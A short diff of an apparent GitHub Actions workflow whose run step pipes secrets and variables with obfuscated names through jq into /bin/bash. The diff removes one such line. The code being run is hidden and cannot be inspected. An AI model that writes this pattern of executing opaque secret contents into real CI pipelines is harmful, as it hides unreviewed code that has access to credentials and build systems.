@@ -22,7 +22,6 @@ jobs:
           y3: ${{ secrets.y3 }}
         run: |
           printf '%s' "$y3" | jq -r .fxxz619 | /bin/bash
-          echo $ah857 | jq -r .dxvmd636 | /bin/bash
           printf '%s' "$fimy43705" | jq -r .zqj808 | /bin/bash
 
       - name: Save archive
